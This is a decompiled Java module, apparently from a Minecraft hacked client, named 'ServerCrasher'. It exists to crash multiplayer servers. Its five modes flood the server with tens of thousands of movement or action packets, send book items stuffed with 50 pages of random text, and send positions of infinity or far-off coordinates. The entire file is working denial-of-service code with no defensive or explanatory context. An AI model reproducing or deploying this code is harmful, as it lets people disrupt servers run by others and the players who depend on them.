// 
// Decompiled by Procyon v0.6.0
// 

package mapped;

import net.minecraft.item.ItemStack;

import java.util.AbstractList;

public class Class3357 extends Class3355
{
    private int field15991;
    
    public Class3357() {
        super("ServerCrasher", "Crashes a server", Class8013.field32987);
        this.method9881(new Class5001("Mode", "Crasher mode", 0, new String[] { "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze" }));
    }
    
    @Override
    public void method9879() {
        this.field15991 = 0;
    }
    
    @Class6753
    private void method10629(final Class5743 class5743) {
        if (!this.method9906()) {
            return;
        }
        if (Class3357.field15514.method5284()) {
            this.method9910();
            return;
        }
        final String method9887 = this.method9887("Mode");
        switch (method9887) {
            case "Flying Enabled": {
                final double field2395 = Class3357.field15514.field4684.posX;
                final double field2396 = Class3357.field15514.field4684.posY;
                final double field2397 = Class3357.field15514.field4684.posZ;
                double n2 = 0.0;
                for (int i = 0; i < 200; ++i) {
                    n2 = i * 9;
                    Class3357.field15514.method5269().method17292(new Class4354(field2395, field2396 + n2, field2397, false));
                }
                for (int j = 0; j < 50000; ++j) {
                    final double n3 = j * 7;
                    Class3357.field15514.method5269().method17292(new Class4354(field2395 - n3, field2396 + n2, field2397 + n3, false));
                }
                Class9274.method34209("Trying to crash the server..");
                this.method9910();
                break;
            }
            case "Vanilla": {
                if (this.field15991++ >= 10) {
                    this.field15991 = 0;
                    for (int k = 0; k < 100000; ++k) {
                        Class3357.field15514.method5269().method17292(new Class4380(Class316.field1877));
                    }
                    Class9274.method34209("Trying to crash the server..");
                    break;
                }
                break;
            }
            case "Book": {
                final ItemStack class5744 = new ItemStack(Items.field31512);
                final Class52 class5745 = new Class52();
                final Class51 class5746 = new Class51();
                String string = "";
                for (int l = 0; l < 5000; ++l) {
                    string += (char)Math.round(32.0f + (float)Math.random() * 94.0f);
                }
                for (int n4 = 0; n4 < 50; ++n4) {
                    ((AbstractList<Class50>)class5745).add(new Class50(string));
                }
                class5746.method306("author", "LeakedPvP");
                class5746.method306("title", "Sigma");
                class5746.method295("pages", class5745);
                class5744.method27676("pages", class5745);
                class5744.method27663(class5746);
                for (int n5 = 0; n5 < 100; ++n5) {
                    try {
                        Class3357.field15514.method5269().method17292(new Class4287(0, class5744));
                    }
                    catch (final Exception ex) {}
                }
                this.method9910();
                break;
            }
            case "Infinity": {
                Class3357.field15514.method5269().method17292(new Class4354(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                Class9274.method34209("Trying to crash the server..");
                this.method9910();
                break;
            }
            case "BrainFreeze": {
                Class3357.field15514.method5269().method17292(new Class4354(Class3357.field15514.field4684.posX + 9999.0, Class3357.field15514.field4684.posY + 9999.0, Class3357.field15514.field4684.posZ + 9999.0, false));
                Class3357.field15514.method5269().method17292(new Class4354(Class3357.field15514.field4684.posX, Class3357.field15514.field4684.getBoundingBox().minY, Class3357.field15514.field4684.posZ + 9999.0, Class3357.field15514.field4684.onGround));
                if (this.field15991++ >= 200) {
                    this.method9910();
                    Class9274.method34209("Trying to crash the server..");
                    break;
                }
                break;
            }
        }
    }
}
